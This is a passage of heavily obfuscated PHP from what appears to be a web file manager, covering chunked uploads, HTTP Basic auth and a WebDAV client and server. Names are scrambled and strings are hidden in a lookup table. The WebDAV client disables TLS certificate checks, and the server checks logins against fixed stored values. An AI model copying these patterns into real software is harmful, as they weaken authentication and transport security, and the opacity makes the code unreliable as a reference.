isset($this->in[$FÖ∑¶Ωß∏‰[520]]) ? intval($this->in[$FÖ∑¶Ωß∏‰[520]]) : 0; $fÃÚ¬ç‘∑ë = isset($this->in[$FÖ∑¶Ωß∏‰[1974]]) ? intval($this->in[$FÖ∑¶Ωß∏‰[1974]]) : 0; goto dà‰µ¨‚∂¯; A–à¨çæ·å: CacheLock::lock($this->tempFile, 20); $BÎÇ°à˘⁄≥ = $this->statusGet(); $this->initFileTemp(); goto AöÌë…¢àÖ; BÃµÜ≤ì¥Ö: $FÖ∑¶Ωß∏‰ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $aÕ…ÿÉõº© = isset($this->in[$FÖ∑¶Ωß∏‰[1971]]) ? intval($this->in[$FÖ∑¶Ωß∏‰[1971]]) : 0; $FüÔÉ”ÏÚÂ = isset($this->in[$FÖ∑¶Ωß∏‰[1972]]) ? intval($this->in[$FÖ∑¶Ωß∏‰[1972]]) : 1; goto Cäùµ‰ÉÑ€; AöÌë…¢àÖ: $aÕ„ëüÊùŸ = $this->moveUploadedFile($Bº‰å£¶—û); if ($f≤ëË¡ÉäÕ > 0 && filesize($aÕ„ëüÊùŸ) == 0) { $this->showJson($FÖ∑¶Ωß∏‰[1976], !1); } if (!$aÕ„ëüÊùŸ) { $this->showJson(LNG($FÖ∑¶Ωß∏‰[1977]), !1); } goto CÀéÑö§˘ﬁ; cÀ“åœúπù: @unlink($aÕ„ëüÊùŸ); if (!$C‚ºÇµÉñ¥) { $this->showJson($FÖ∑¶Ωß∏‰[1979] . $aÕ…ÿÉõº©, !1); } $BÎÇ°à˘⁄≥[$FÖ∑¶Ωß∏‰[1980]] = $FüÔÉ”ÏÚÂ; goto Dµ Ö©ŸÕÇ; d›ˆ∏êáÏ§: } private function checkSize() { $cÍ”∏Â”ﬂä =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (phpBuild64() || $this->in[$cÍ”∏Â”ﬂä[77]] < PHP_INT_MAX) { return; } show_json(LNG($cÍ”∏Â”ﬂä[1986]), !1); } private function showJson($A¥ÖÇÕ∑£„, $Fº∞∞≤®üç) { CacheLock::unlock($this->tempFile); if (!$Fº∞∞≤®üç) { return show_json($A¥ÖÇÕ∑£„, $Fº∞∞≤®üç); } show_json($A¥ÖÇÕ∑£„, $Fº∞∞≤®üç); } public function clearData() { $this->statusSet(!1); if (file_exists($this->tempFile)) { @unlink($this->tempFile); return; } } private function tempPathInit() { goto fêƒ‡ªûæ¿; fêƒ‡ªûæ¿: $cπë“à°“Ì =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $b› √ÉŸ∆º = TEMP_FILES; @mk_dir($b› √ÉŸ∆º); goto fîÂéÇ§Ò‘; Bá„¬≠•ÀÊ: $this->tempFile = $b› √ÉŸ∆º . $cπë“à°“Ì[1989] . md5($eíº“º€¢ . $this->in[$cπë“à°“Ì[1533]]); goto F·‚›ßÿ÷≈; fîÂéÇ§Ò‘: touch($b› √ÉŸ∆º . $cπë“à°“Ì[1987]); $eíº“º€¢ = isset($this->in[$cπë“à°“Ì[1988]]) ? $this->in[$cπë“à°“Ì[1988]] : !1; if (strlen($eíº“º€¢) < 30) { $eíº“º€¢ = md5(USER_ID . $this->in[$cπë“à°“Ì[75]] . $this->fileName . $this->in[$cπë“à°“Ì[77]]); } goto Bá„¬≠•ÀÊ; F·‚›ßÿ÷≈: } private function moveUploadedFile($Eƒ‚ö≥éú‘) { $d•¢Ñ§¯◊À =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $C¶Æ€üù≈∆ = $this->uploadFile; if ($C¶Æ€üù≈∆ == $d•¢Ñ§¯◊À[1990]) { @file_put_contents($Eƒ‚ö≥éú‘, base64_decode($_REQUEST[$d•¢Ñ§¯◊À[1991]])); } else { if ($C¶Æ€üù≈∆ == $d•¢Ñ§¯◊À[1815]) { $cáóÑé÷ôÉ = @fopen($Eƒ‚ö≥éú‘, $d•¢Ñ§¯◊À[1523]); $this->writeTo($C¶Æ€üù≈∆, $cáóÑé÷ôÉ, $Eƒ‚ö≥éú‘); } else { if (!move_uploaded_file($C¶Æ€üù≈∆, $Eƒ‚ö≥éú‘)) { return !1; } } } return $Eƒ‚ö≥éú‘; } private function writeTo($b⁄Ú∞ƒ¢Æ´, $e˜È¢™Ï≈ß, $Cú¥Ò¡£˘œ) { goto DÁ±Ñë´ô⁄; BˆÇ¶çÀ˜Ê: return !0; goto CΩèÑ©¯Ô≈; F–ÎŸÓÉ‚‹: $dªËç‰öÇô = @fopen($b⁄Ú∞ƒ¢Æ´, $cøÙ„Ûû‘Õ[1522]); if (!$dªËç‰öÇô || !$e˜È¢™Ï≈ß || !$FÉÕ•ÓÊ‰∞) { CacheLock::unlock($Bêç˘çáÍÉ); return !1; } while (!feof($dªËç‰öÇô)) { fwrite($e˜È¢™Ï≈ß, fread($dªËç‰öÇô, 1024 * 200)); } goto bÉﬁÁ¡ÿ—‹; bÉﬁÁ¡ÿ—‹: fclose($dªËç‰öÇô); fclose($e˜È¢™Ï≈ß); CacheLock::unlock($Bêç˘çáÍÉ); goto BˆÇ¶çÀ˜Ê; DÁ±Ñë´ô⁄: $cøÙ„Ûû‘Õ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $Bêç˘çáÍÉ = $cøÙ„Ûû‘Õ[1992] . $Cú¥Ò¡£˘œ; $FÉÕ•ÓÊ‰∞ = CacheLock::lock($Bêç˘çáÍÉ, 1); goto F–ÎŸÓÉ‚‹; CΩèÑ©¯Ô≈: } private function statusGet() { goto fõ«◊ÑÒı; Aúé‰ù‡Óé: if (!$this->statusData) { $Cãç¡Ôâ—© = array($EçÑÉ∏◊üì[28] => $this->fileName, $EçÑÉ∏◊üì[1980] => 0, $EçÑÉ∏◊üì[1981] => array()); $this->statusSet($Cãç¡Ôâ—©); } return $this->statusData; goto aÛÒáÆ´∫™; bäµ”èÌ⁄®: $F¨∫∑ªÒ¯Ω = !1; if (file_exists($fê¬â√Ç‰∑)) { $F¨∫∑ªÒ¯Ω = @file_get_contents($fê¬â√Ç‰∑); } if ($F¨∫∑ªÒ¯Ω) { $this->statusData = json_decode($F¨∫∑ªÒ¯Ω, !0); } goto Aúé‰ù‡Óé; fõ«◊ÑÒı: $EçÑÉ∏◊üì =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (is_array($this->statusData)) { return $this->statusData; } $fê¬â√Ç‰∑ = $this->tempFile . $EçÑÉ∏◊üì[1993]; goto bäµ”èÌ⁄®; aÛÒáÆ´∫™: } public function statusSet($d¬™¥ﬁ‡âì) { $C“Ñ√ÆÔºŸ = $this->tempFile . $_SERVER[Ä¿¡‡öóµŸﬂ‡][1993]; if (!$d¬™¥ﬁ‡âì) { if (file_exists($C“Ñ√ÆÔºŸ)) { @unlink($C“Ñ√ÆÔºŸ); } return !0; } $this->statusData = $d¬™¥ﬁ‡âì; return file_put_contents($C“Ñ√ÆÔºŸ, json_encode($d¬™¥ﬁ‡âì)); } private function initFileTemp() { $AÇı≤ÁÕ§â =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (file_exists($this->tempFile)) { return; } $f±µ«èØÿπ = fopen($this->tempFile, $AÇı≤ÁÕ§â[1994]); fseek($f±µ«èØÿπ, $this->in[$AÇı≤ÁÕ§â[77]] - 1, SEEK_SET); fwrite($f±µ«èØÿπ, $AÇı≤ÁÕ§â[468]); fclose($f±µ«èØÿπ); } public function checkChunk() { goto eÓ‡Ëè¢È¶; eÓ‡Ëè¢È¶: $FÑèÀÖ…˘∏ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $c√ıÔÂç›é = array(); CacheLock::lock($this->tempFile); goto Bï‚µ‰ûÃ≈; A∏ﬂ¿çÖ∏¥: return $c√ıÔÂç›é; goto DçÀœÔﬁµ»; Bï‚µ‰ûÃ≈: $c„€è≥ıØÉ = $this->statusGet(); CacheLock::unlock($this->tempFile); foreach ($c„€è≥ıØÉ[$FÑèÀÖ…˘∏[1981]] as $D∂∑¨µõœü) { $F∆Œ∏Î≠ê· = $D∂∑¨µõœü[$FÑèÀÖ…˘∏[164]]; if ($F∆Œ∏Î≠ê·) { $c√ıÔÂç›é[$FÑèÀÖ…˘∏[1995] . $D∂∑¨µõœü[$FÑèÀÖ…˘∏[1040]]] = $F∆Œ∏Î≠ê·; } } goto A∏ﬂ¿çÖ∏¥; DçÀœÔﬁµ»: } private function checkChunkHash($d¥ö∞ìîÊ‹) { goto f¥âó∞≤Ñﬂ; CÈ€ôÇÁÃ∆: $b∏™äÿ»‹å = !0; foreach ($d¥ö∞ìîÊ‹[$cúÍä¥Ú¢ó[1981]] as $D≠áÖÚ∏ˆÒ) { fseek($d∏πëµŒ¥¨, $D≠áÖÚ∏ˆÒ[$cúÍä¥Ú¢ó[1983]]); $aãàœ¬ÉßØ = PathDriverStream::hash($d∏πëµŒ¥¨, $D≠áÖÚ∏ˆÒ[$cúÍä¥Ú¢ó[77]]); if ($D≠áÖÚ∏ˆÒ[$cúÍä¥Ú¢ó[164]] != $aãàœ¬ÉßØ) { $b∏™äÿ»‹å = !1; break; } } fclose($d∏πëµŒ¥¨); goto aÊ—óçÓ©Û; aÊ—óçÓ©Û: return $b∏™äÿ»‹å; goto c˘¬µ®Á˜º; f¥âó∞≤Ñﬂ: $cúÍä¥Ú¢ó =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (count($d¥ö∞ìîÊ‹[$cúÍä¥Ú¢ó[1981]]) != $d¥ö∞ìîÊ‹[$cúÍä¥Ú¢ó[1980]]) { return !1; } $fÕÿÓπô€∏ = _get($this->in, $cúÍä¥Ú¢ó[1988]); goto BŒêêè£Ç¨; BŒêêè£Ç¨: $FÎƒ§¥∆üö = _get($this->in, $cúÍä¥Ú¢ó[1996]); if (strlen($FÎƒ§¥∆üö) == 32 && IO::hashSimple($this->tempFile) == $fÕÿÓπô€∏ && IO::hashMd5($this->tempFile) == $FÎƒ§¥∆üö) { return !0; } $d∏πëµŒ¥¨ = fopen($this->tempFile, $cúÍä¥Ú¢ó[1173]); goto CÈ€ôÇÁÃ∆; c˘¬µ®Á˜º: } public static function fileName() { goto e¯úÿ≥ÿÔ≥; A‡ äêÊ°≈: $a¬Ö√»Çﬂ± = $a¬Ö√»Çﬂ± ? $a¬Ö√»Çﬂ± : time(); $A”ìéŒöÏ‡ = strtolower($d”¨Ú◊±√Ü); if ($A”ìéŒöÏ‡ == $Bºœ€î∆ãÚ[1998] || $A”ìéŒöÏ‡ == $Bºœ€î∆ãÚ[1999]) { $d”¨Ú◊±√Ü = date($Bºœ€î∆ãÚ[690], $a¬Ö√»Çﬂ±) . $Bºœ€î∆ãÚ[70] . $in[$Bºœ€î∆ãÚ[77]] . $Bºœ€î∆ãÚ[1630]; } else { if ($A”ìéŒöÏ‡ == $Bºœ€î∆ãÚ[2000]) { $d”¨Ú◊±√Ü = date($Bºœ€î∆ãÚ[690], $a¬Ö√»Çﬂ±) . $Bºœ€î∆ãÚ[70] . $in[$Bºœ€î∆ãÚ[77]] . $Bºœ€î∆ãÚ[2001]; } } goto F°Ôü≠†î√; F°Ôü≠†î√: return KodIO::clear($d”¨Ú◊±√Ü); goto aÓ¡¶∫ÎÇü; FË äÑéãµ: if (!empty($_FILES)) { $d”¨Ú◊±√Ü = $d”¨Ú◊±√Ü ? $d”¨Ú◊±√Ü : $_FILES[$Bºœ€î∆ãÚ[167]][$Bºœ€î∆ãÚ[386]]; } if (!is_wap()) { return KodIO::clear($d”¨Ú◊±√Ü); } $a¬Ö√»Çﬂ± = strtotime($in[$Bºœ€î∆ãÚ[1997]]); goto A‡ äêÊ°≈; e¯úÿ≥ÿÔ≥: $Bºœ€î∆ãÚ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; global $in; $d”¨Ú◊±√Ü = isset($in[$Bºœ€î∆ãÚ[28]]) ? $in[$Bºœ€î∆ãÚ[28]] : $Bºœ€î∆ãÚ[33]; goto FË äÑéãµ; aÓ¡¶∫ÎÇü: } private function errorInfo($fä€ÓËã¿ë) { $EŸ«·Û˘∂à =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $bö‰≥àà”∏ = array($EŸ«·Û˘∂à[2002], $EŸ«·Û˘∂à[2003], $EŸ«·Û˘∂à[2004], $EŸ«·Û˘∂à[2005], $EŸ«·Û˘∂à[2006], $EŸ«·Û˘∂à[2007], $EŸ«·Û˘∂à[2008], $EŸ«·Û˘∂à[2009]); return $fä€ÓËã¿ë . $EŸ«·Û˘∂à[4] . $bö‰≥àà”∏[$fä€ÓËã¿ë]; } } goto BéƒÚÏ¡˘; A¯¥îœìÏí: class HttpAuth { public static function get() { $bãøŸÈ”∂á =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $fÚÿÓÛÑ±µ = $bãøŸÈ”∂á[33]; $dö‡óÇô® = $bãøŸÈ”∂á[33]; if (isset($_SERVER[$bãøŸÈ”∂á[1761]])) { $fÚÿÓÛÑ±µ = $_SERVER[$bãøŸÈ”∂á[1761]]; $dö‡óÇô® = $_SERVER[$bãøŸÈ”∂á[1762]]; } elseif (isset($_SERVER[$bãøŸÈ”∂á[1763]])) { $b‚ùÕü˘ÑÜ = $_SERVER[$bãøŸÈ”∂á[1763]]; if (strpos(strtolower($b‚ùÕü˘ÑÜ), $bãøŸÈ”∂á[1764]) === 0) { $fÂÍºëı©‘ = explode($bãøŸÈ”∂á[4], base64_decode(substr($b‚ùÕü˘ÑÜ, 6))); $fÚÿÓÛÑ±µ = isset($fÂÍºëı©‘[0]) ? $fÂÍºëı©‘[0] : $bãøŸÈ”∂á[33]; $dö‡óÇô® = isset($fÂÍºëı©‘[1]) ? $fÂÍºëı©‘[1] : 0; } } return array($bãøŸÈ”∂á[535] => $fÚÿÓÛÑ±µ, $bãøŸÈ”∂á[901] => $dö‡óÇô®); } public static function error() { goto f«ûœÙ«§ø; f«ûœÙ«§ø: $aäŸµÉ‰Ñ√ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; header($aäŸµÉ‰Ñ√[1765]); header($aäŸµÉ‰Ñ√[1766]); goto b°íè¢ÑÙÜ; b°íè¢ÑÙÜ: header($aäŸµÉ‰Ñ√[1767]); header($aäŸµÉ‰Ñ√[1768]); header($aäŸµÉ‰Ñ√[1266]); goto bíÍÒŒ à; bíÍÒŒ à: die; goto dûîÙﬂèì§; dûîÙﬂèì§: } public static function make($BÎ⁄∞Ù‹ìª, $bÚ™·ø€ºº) { $DÂ®„§ÁãÓ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; return $DÂ®„§ÁãÓ[1769] + base64_encode($BÎ⁄∞Ù‹ìª . $DÂ®„§ÁãÓ[4] . $bÚ™·ø€ºº); } } class HttpDavClient { public function __construct($dî÷ÊÆÕ∆ò, $fÿóíÉÜ≥æ, $A¯∑ƒ€‰Èº) { $this->header = array(); $this->userName = $fÿóíÉÜ≥æ; $this->userPassowrd = $A¯∑ƒ€‰Èº; } protected function makePath($b£¿É√ê“ó) { return $b£¿É√ê“ó; } protected function setHeader($EãŸˆâáë©, $d›˘∞ëÌÑ  = false) { if ($d›˘∞ëÌÑ  === !1) { $this->header[] = $EãŸˆâáë©; } else { $this->header[] = $EãŸˆâáë© . $_SERVER[Ä¿¡‡öóµŸﬂ‡][884] . $d›˘∞ëÌÑ ; } } public function move($cŸ≠¡êﬁ’™, $B Ç›©›ûÿ, $b…´ñ£≤∆– = '') { $Fê∫î˘⁄ÉΩ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $this->setHeader($Fê∫î˘⁄ÉΩ[1770], $this->makePath($B Ç›©›ûÿ)); $this->setHeader($Fê∫î˘⁄ÉΩ[1771], $Fê∫î˘⁄ÉΩ[1772]); if ($b…´ñ£≤∆–) { $this->setHeader($Fê∫î˘⁄ÉΩ[1773], $Fê∫î˘⁄ÉΩ[929] . $b…´ñ£≤∆– . $Fê∫î˘⁄ÉΩ[932]); } return $this->send($Fê∫î˘⁄ÉΩ[1774], $cŸ≠¡êﬁ’™); } public function copy($Dµ ÏΩ∆ﬂ˜, $CÁ–ŒÜ„∫•) { $E¶ï›ÆÍÔ® =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $this->setHeader($E¶ï›ÆÍÔ®[1770], $this->makePath($CÁ–ŒÜ„∫•)); $this->setHeader($E¶ï›ÆÍÔ®[1771], $E¶ï›ÆÍÔ®[1772]); return $this->send($E¶ï›ÆÍÔ®[1775], $Dµ ÏΩ∆ﬂ˜); } public function mkcol($b›§†¡ÜŸÛ) { $C£î¬íä‘‚ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $this->setHeader($C£î¬íä‘‚[1771], $C£î¬íä‘‚[1772]); return $this->send($C£î¬íä‘‚[1776], $b›§†¡ÜŸÛ); } public function delete($C»∏€ªΩÍœ, $aß¶∑∂ﬁ√ = '') { $a®∫“¿∆¬œ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if ($aß¶∑∂ﬁ√) { $this->setHeader($a®∫“¿∆¬œ[1773], $a®∫“¿∆¬œ[929] . $aß¶∑∂ﬁ√ . $a®∫“¿∆¬œ[932]); } return $this->send($a®∫“¿∆¬œ[1254], $C»∏€ªΩÍœ); } public function propfind($b√∏ıœ¬À◊) { $c‹∂„ºô‹ˆ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $this->setHeader($c‹∂„ºô‹ˆ[1777], $c‹∂„ºô‹ˆ[83]); $this->setHeader($c‹∂„ºô‹ˆ[1778], $c‹∂„ºô‹ˆ[1779]); $aäë‹»Ê˘î = $c‹∂„ºô‹ˆ[1780]; return $this->send($c‹∂„ºô‹ˆ[1781], $b√∏ıœ¬À◊, $aäë‹»Ê˘î); } public function options($C∂◊Ôìàç) { return $this->send($_SERVER[Ä¿¡‡öóµŸﬂ‡][1782], $C∂◊Ôìàç); } public function get($Fß¨’£ÂßÑ) { return $this->send($_SERVER[Ä¿¡‡öóµŸﬂ‡][216], $Fß¨’£ÂßÑ); } public function put($fºñÂÚ‹ƒŸ, $a¢æ‘Ò¡ÿ¬, $Fø˜—≥§≤® = '') { $fµ¿ÓÙŒ∆ú =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if ($Fø˜—≥§≤®) { $this->setHeader($fµ¿ÓÙŒ∆ú[1773], $fµ¿ÓÙŒ∆ú[929] . $Fø˜—≥§≤® . $fµ¿ÓÙŒ∆ú[932]); } return $this->send($fµ¿ÓÙŒ∆ú[214], $fºñÂÚ‹ƒŸ, $a¢æ‘Ò¡ÿ¬); } protected function send($A€ñ‘ûÀë€, $CÙ∞ˆœÛÿí, $D’◊ê°ÖÚ¿ = false, $aíÍ“œÆùƒ = false) { goto CëÖ∆≤á≤ê; BÓ…“ƒ¬≠ñ: curl_setopt($bÑ†ô≥ÇœÃ, CURLOPT_SSL_VERIFYPEER, !1); curl_setopt($bÑ†ô≥ÇœÃ, CURLOPT_SSL_VERIFYHOST, !1); $E…Ò©ÔãõŸ = curl_exec($bÑ†ô≥ÇœÃ); goto Eºƒá—◊‡ì; aòö‚†§âÛ: $bÑ†ô≥ÇœÃ = curl_init($CÙ∞ˆœÛÿí); curl_setopt($bÑ†ô≥ÇœÃ, CURLOPT_CUSTOMREQUEST, $A€ñ‘ûÀë€); curl_setopt($bÑ†ô≥ÇœÃ, CURLOPT_HTTPAUTH, CURLAUTH_ANY); goto d¢ ºüÖÕÉ; d¢ ºüÖÕÉ: curl_setopt($bÑ†ô≥ÇœÃ, CURLOPT_HTTPHEADER, $this->header); curl_setopt($bÑ†ô≥ÇœÃ, CURLOPT_RETURNTRANSFER, !0); curl_setopt($bÑ†ô≥ÇœÃ, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); goto BÓ…“ƒ¬≠ñ; CëÖ∆≤á≤ê: $f¿‚ÚŸˆÙê =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $fÈÂêÆç‹Ù = HttpAuth::make($this->userName, $this->userPassowrd); $this->setHeader($f¿‚ÚŸˆÙê[1783], $f¿‚ÚŸˆÙê[50]); goto EÃµúÁÒ≤Ü; EÃµúÁÒ≤Ü: $this->setHeader($fÈÂêÆç‹Ù); if ($D’◊ê°ÖÚ¿) { $D’◊ê°ÖÚ¿ = $f¿‚ÚŸˆÙê[1784] . $D’◊ê°ÖÚ¿; } if (!request_url_safe($CÙ∞ˆœÛÿí)) { return !1; } goto aòö‚†§âÛ; Eºƒá—◊‡ì: $this->header = array(); return $E…Ò©ÔãõŸ; goto F∫Ç•èÊºÌ; F∫Ç•èÊºÌ: } } class HttpDavServer { public function __construct($aØ¿…ÿ√˘ò, $A”Ÿ¬≠≥®π) { $this->root = $aØ¿…ÿ√˘ò; $this->initPath($A”Ÿ¬≠≥®π); $this->start(); } public function initPath($e˜´ä±†∑Ì) { $AπëÌπ»Ëä =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $eäê¡¨´Êå = rtrim($_SERVER[$AπëÌπ»Ëä[1389]], $AπëÌπ»Ëä[8]) . $AπëÌπ»Ëä[8]; $this->urlBase = substr($eäê¡¨´Êå, 0, strpos($eäê¡¨´Êå, $e˜´ä±†∑Ì) + 1); $this->urlBase = rtrim($this->urlBase, $AπëÌπ»Ëä[8]) . $e˜´ä±†∑Ì; $this->path = $this->parsePath($this->pathGet()); } public function checkUser() { $B¥ù∑ÑçÖê =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $B©ô≤°–ŒÒ = HttpAuth::get(); if ($B©ô≤°–ŒÒ[$B¥ù∑ÑçÖê[535]] == $B¥ù∑ÑçÖê[1785] && $B©ô≤°–ŒÒ[$B¥ù∑ÑçÖê[901]] == $B¥ù∑ÑçÖê[1786]) { return !0; } HttpAuth::error(); } public function start() { goto bÖ–∑Ω◊â‡; a¿åŒ€à©î: if (!method_exists($this, $C»◊…®ÍÔè)) { pr($C»◊…®ÍÔè . $e…‰‰˜∫‡Ÿ[1787]); die; } $bÍÓ≠±Ì¯â = array($e…‰‰˜∫‡Ÿ[1788], $e…‰‰˜∫‡Ÿ[1789]); if (!in_array($C»◊…®ÍÔè, $bÍÓ≠±Ì¯â) && !$this->pathExists($this->path)) { $bº¯Ê⁄Ï∑å = array($e…‰‰˜∫‡Ÿ[1036] => 404); } else { $bº¯Ê⁄Ï∑å = $this->{$C»◊…®ÍÔè}(); } goto a¶”ÕÎÈÛÓ; bÖ–∑Ω◊â‡: $e…‰‰˜∫‡Ÿ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $this->checkUser(); $C»◊…®ÍÔè = $e…‰‰˜∫‡Ÿ[144] . HttpHeader::method(); goto a¿åŒ€à©î; a¶”ÕÎÈÛÓ: if (!$bº¯Ê⁄Ï∑å) { return; } self::response($bº¯Ê⁄Ï∑å); goto FààƒÑ“’¥; FààƒÑ“’¥: } public function pathGet($B≤∫ÃÉçá˘ = false) { $fç≤—Æêè‰ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $c‘û«ÿÀÎ¿ = $B≤∫ÃÉçá˘ ? $_SERVER[$fç≤—Æêè‰[1790]] : $_SERVER[$fç≤—Æêè‰[1389]]; $c‘û«ÿÀÎ¿ = KodIO::clear(rawurldecode($c‘û«ÿÀÎ¿)); if (!strstr($c‘û«ÿÀÎ¿, KodIO::clear($this->urlBase))) { return !1; } return substr($c‘û«ÿÀÎ¿, strpos($c‘û«ÿÀÎ¿, $this->urlBase) + strlen($this->urlBase)); } public function pathExists($cÉêÉ∞¨—Ø) { return file_exists($cÉêÉ∞¨—Ø); } public function pathMkdir($CÚÖŸÌ˜êÿ) { return mkdir($CÚÖŸÌ˜êÿ, 511, !0); } public function pathInfo($bÈÔ≠ΩÒÇ˜) { return path_info($bÈÔ≠ΩÒÇ˜); } public function pathList($cã›Èö»öÉ) { return path_list($cã›Èö»öÉ); } public function pathOut($dÖÏÈ–⁄ŒŒ) { echo file_get_contents($dÖÏÈ–⁄ŒŒ); } public function pathPut($a‡–˜≥»Ûç, $Aöàñ∫øÉ£ = '') { if (!$Aöàñ∫øÉ£) { return file_put_contents($a‡–˜≥»Ûç, $_SERVER[Ä¿¡‡öóµŸﬂ‡][33]); } return move_path($Aöàñ∫øÉ£, $a‡–˜≥»Ûç); } public function pathRemove($E»´Á»Áà¥) { if (is_file($E»´Á»Áà¥)) { return @unlink($this->path); } else { return del_dir($this->path); } } public function pathMove($dÂüÕëä±ä, $Fï«†çÌ∑ï) { return move_path($dÂüÕëä±ä, $Fï«†çÌ∑ï); } public function pathCopy($fùÕ≠ú≤¿Œ, $e‡ú°ˆ˜á™) { return copy_dir($fùÕ≠ú≤¿Œ, $e‡ú°ˆ˜á™); } public function parsePath($bõÓß´óŒ¶) { return $bõÓß´óŒ¶; } public function parseItem($d˜•«éãæ‡, $eÃ©ı¥”÷ö) { goto e…«÷Ò≈¨í; f≈ÔÛóçŸñ: $cÇóÿ•ßÖ∆ = array($C€¢Ó˜¬ò—[1791] => KodIO::clear($this->urlBase . $aãàıô°‡∂), $C€¢Ó˜¬ò—[107] => @gmdate($C€¢Ó˜¬ò—[1792], $d˜•«éãæ‡[$C€¢Ó˜¬ò—[107]]), $C€¢Ó˜¬ò—[187] => @gmdate($C€¢Ó˜¬ò—[1793], $d˜•«éãæ‡[$C€¢Ó˜¬ò—[187]]), $C€¢Ó˜¬ò—[77] => $d˜•«éãæ‡[$C€¢Ó˜¬ò—[77]] ? $d˜•«éãæ‡[$C€¢Ó˜¬ò—[77]] : 0); return $cÇóÿ•ßÖ∆; goto Eî√ÿﬂêƒŒ; aÔ¬”øôóì: if ($eÃ©ı¥”÷ö) { $aãàıô°‡∂ = $C€¢Ó˜¬ò—[8] . str_replace($C€¢Ó˜¬ò—[172], $C€¢Ó˜¬ò—[8], rawurlencode($this->pathGet())); } if (!trim($d˜•«éãæ‡[$C€¢Ó˜¬ò—[107]])) { $d˜•«éãæ‡[$C€¢Ó˜¬ò—[107]] = time(); } if (!trim($d˜•«éãæ‡[$C€¢Ó˜¬ò—[187]])) { $d˜•«éãæ‡[$C€¢Ó˜¬ò—[187]] = time(); } goto f≈ÔÛóçŸñ; e…«÷Ò≈¨í: $C€¢Ó˜¬ò— =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $aãàıô°‡∂ = $this->pathGet() . $C€¢Ó˜¬ò—[8] . $d˜•«éãæ‡[$C€¢Ó˜¬ò—[28]]; $aãàıô°‡∂ = $C€¢Ó˜¬ò—[8] . str_replace($C€¢Ó˜¬ò—[172], $C€¢Ó˜¬ò—[8], rawurlencode($aãàıô°‡∂)); goto aÔ¬”øôóì; Eî√ÿﬂêƒŒ: } public function parseItemXml($cıä—¢£–“, $d›ﬁıπö°Â) { $eÆËåÓ≠À§ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $cÉ∆øÌôÕé = $this->parseItem($cıä—¢£–“, $d›ﬁıπö°Â); if ($cıä—¢£–“[$eÆËåÓ≠À§[29]] == $eÆËåÓ≠À§[76]) { $F‹âöÁñ∞∆ = $eÆËåÓ≠À§[1794]; $F‹âöÁñ∞∆ .= $eÆËåÓ≠À§[1795]; } else { $fâçˆÓÌÌ∏ = $cıä—¢£–“[$eÆËåÓ≠À§[160]] ? $cıä—¢£–“[$eÆËåÓ≠À§[160]] : get_path_ext($cıä—¢£–“[$eÆËåÓ≠À§[28]]); $E“öÏ‚æ∏ê = get_file_mime($fâçˆÓÌÌ∏); $F‹âöÁñ∞∆ = $eÆËåÓ≠À§[1796]; $F‹âöÁñ∞∆ .= "\74\104\x3a\x67\145\x74\x63\x6f\x6e\x74\x65\156\164\164\171\160\145\76{$E“öÏ‚æ∏ê}\x3c\x2f\104\x3a\x67\x65\x74\143\157\x6e\x74\x65\156\164\x74\x79\160\x65\76"; } return "\12\x9\x9\74\104\72\162\145\x73\x70\x6f\x6e\163\x65\x3e\12\11\11\11\74\104\x3a\x68\x72\145\x66\76{$cÉ∆øÌôÕé[$eÆËåÓ≠À§[1791]]}\74\57\104\x3a\150\162\x65\146\76\12\11\11\11\x3c\104\72\x70\162\x6f\x70\163\164\x61\164\76\12\x9\x9\x9\x9\x3c\104\x3a\160\x72\157\x70\76\xa\11\x9\x9\11\x9\74\104\72\147\x65\x74\154\141\x73\x74\x6d\x6f\144\151\146\x69\x65\144\76{$cÉ∆øÌôÕé[$eÆËåÓ≠À§[107]]}\74\57\x44\72\147\145\x74\x6c\141\x73\x74\155\x6f\144\x69\x66\151\145\144\x3e\xa\x9\11\11\x9\11\74\x44\x3a\x63\x72\145\x61\x74\151\157\156\144\141\164\x65\76{$cÉ∆øÌôÕé[$eÆËåÓ≠À§[187]]}\74\x2f\104\72\x63\162\145\141\164\151\157\156\144\x61\x74\x65\76\12\11\x9\11\x9\11\x3c\x44\x3a\147\145\x74\143\157\x6e\164\x65\156\x74\154\145\x6e\x67\x74\x68\x3e{$cÉ∆øÌôÕé[$eÆËåÓ≠À§[77]]}\x3c\57\104\72\x67\145\164\x63\x6f\156\x74\145\x6e\164\154\145\x6e\x67\x74\150\x3e\xa\11\x9\x9\11\x9{$F‹âöÁñ∞∆}\xa\11\11\x9\x9\x3c\57\x44\72\160\162\157\160\76\xa\11\x9\x9\11\74\104\72\163\x74\141\x74\165\x73\x3e\x48\x54\124\120\57\61\x2e\x31\40\x32\x30\60\x20\117\113\x3c\x2f\x44\72\163\164\x61\164\165\163\76\xa\x9\11\x9\74\x2f\x44\72\160\x72\157\160\163\164\x61\164\76\12\x9\11\x3c\57\104\72\162\x65\x73\160\157\x6e\x73\145\x3e"; } public function pathListMerge($F¨≥•»û÷Ç) { goto DæÈ©éöñÇ; DæÈ©éöñÇ: $B£—ÇŒ¡°Ñ =& 